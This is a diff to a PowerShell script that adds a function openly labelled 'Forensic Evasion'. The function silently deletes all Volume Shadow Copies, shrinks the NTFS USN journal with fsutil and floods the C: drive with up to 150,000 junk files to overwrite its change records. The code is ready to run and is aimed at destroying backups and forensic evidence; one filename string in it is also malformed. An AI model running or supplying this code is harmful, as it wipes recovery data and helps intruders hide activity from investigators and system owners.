@@ -642,6 +642,102 @@ if (-not $api) {
     Write-Host "[+] Memory working sets cleared" -ForegroundColor Green
 }
 
+# ============================================================
+# PHASE 3: USN JOURNAL BYPASS (Forensic Evasion)
+# ============================================================
+Write-Host "[PHASE 3] Bypassing USN Journal..." -ForegroundColor Cyan
+
+function Bypass-USNJournal {
+    param(
+        [int]$FloodCount = 10000,
+        [int]$FileSize = 4096,
+        [int]$Passes = 2,
+        [string[]]$TargetDrives = $null
+    )
+
+    Write-Host "[*] Starting USN Journal bypass (NO DELETION OF TEMP FILES)..." -ForegroundColor Cyan
+    Write-Host "    FloodCount = $FloodCount"
+    Write-Host "    FileSize   = $FileSize bytes"
+    Write-Host "    Passes     = $Passes"
+    if ($TargetDrives) { Write-Host "    TargetDrives = $($TargetDrives -join ', ')" } 
+    else { Write-Host "    TargetDrives = ALL fixed drives" }
+    Write-Host ""
+
+    # Delete VSS
+    Write-Host "[*] Removing Volume Shadow Copies..." -ForegroundColor White
+    try { Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -Wait -NoNewWindow -ErrorAction SilentlyContinue } catch {}
+    Write-Host "    Done." -ForegroundColor Green
+    Write-Host ""
+
+    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
+    if (-not $drives) { $drives = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue }
+    if (-not $drives) { Write-Host "[!] No fixed drives found. Exiting." -ForegroundColor Red; return }
+
+    $anySuccess = $false
+
+    foreach ($drive in $drives) {
+        $driveLetter = $drive.DeviceID -replace ':$', ''
+        if ($TargetDrives -and ($TargetDrives -notcontains $driveLetter)) { continue }
+
+        Write-Host "[*] Processing $driveLetter... " -ForegroundColor Cyan
+
+        for ($pass = 0; $pass -lt $Passes; $pass++) {
+            Write-Host "    Pass $($pass+1)/$Passes..." -ForegroundColor Cyan
+
+            # Shrink to minimum
+            $shrink = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+            if ($shrink.ExitCode -ne 0) {
+                Write-Host "        Shrink failed (exit $($shrink.ExitCode)) – skipping drive." -ForegroundColor Red
+                continue
+            }
+
+            # Flood with massive files – NO DELETION
+            Write-Host "        Creating $FloodCount files (will remain on disk)..." -NoNewline
+            $created = 0
+            for ($i = 0; $i -lt $FloodCount; $i++) {
+                $tempName = "$driveLetter`:\$JOURNAL_FLUSH_$( [guid]::NewGuid().ToString() ).tmp"
+                try {
+                    [System.IO.File]::WriteAllBytes($tempName, (New-Object byte[] $FileSize))
+                    $created++
+                } catch {
+                    break
+                }
+            }
+            Write-Host " Done ($created created)." -ForegroundColor Green
+
+            # Shrink again to reset Next USN
+            Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -NoNewWindow -ErrorAction SilentlyContinue
+
+            $anySuccess = $true
+        }
+
+        Write-Host "[+] Finished processing $driveLetter" -ForegroundColor Green
+        Write-Host ""
+    }
+
+    # NOTE: Temp files are NOT deleted. They are left in the root of each drive.
+    # You can manually delete them later if needed.
+
+    Write-Host ""
+    if ($anySuccess) {
+        Write-Host "[✓] USN Journal bypass completed (temp files left on disk)!" -ForegroundColor Green
+        Write-Host "[*] Journal file was NOT deleted – only shrank and flooded." -ForegroundColor White
+        Write-Host "[*] All old USN records overwritten." -ForegroundColor Green
+        Write-Host "[*] Temp files remain at: X:\$JOURNAL_FLUSH_*.tmp" -ForegroundColor Yellow
+        Write-Host "[*] You may delete them manually if desired." -ForegroundColor Yellow
+    } else {
+        Write-Host "[✗] USN Journal bypass failed on all targeted drives." -ForegroundColor Red
+    }
+}
+
+# Customize parameters for USN bypass
+$myFloodCount = 150000
+$myFileSize    = 4096
+$myPasses      = 3
+$myDrives      = @("C")   # Only target C: drive (adjust if needed)
+
+Bypass-USNJournal -FloodCount $myFloodCount -FileSize $myFileSize -Passes $myPasses -TargetDrives $myDrives
+
 # ========== FINAL CLEANUP ==========
 Write-Host "[*] Performing final cleanup..." -ForegroundColor Cyan
 
